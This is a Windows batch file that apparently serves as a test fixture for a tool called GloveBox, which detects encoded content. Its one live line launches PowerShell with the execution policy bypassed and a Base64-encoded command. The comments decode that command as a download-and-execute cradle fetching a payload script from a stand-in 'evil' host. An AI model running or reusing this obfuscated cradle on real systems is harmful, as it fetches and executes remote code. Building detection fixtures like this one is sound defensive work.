@echo off
REM This is a test file for GloveBox encoded content detection.
REM The -EncodedCommand contains a Base64-encoded UTF-16LE PowerShell command.
REM Decoded it says: IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/payload.ps1')

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA

echo Done.
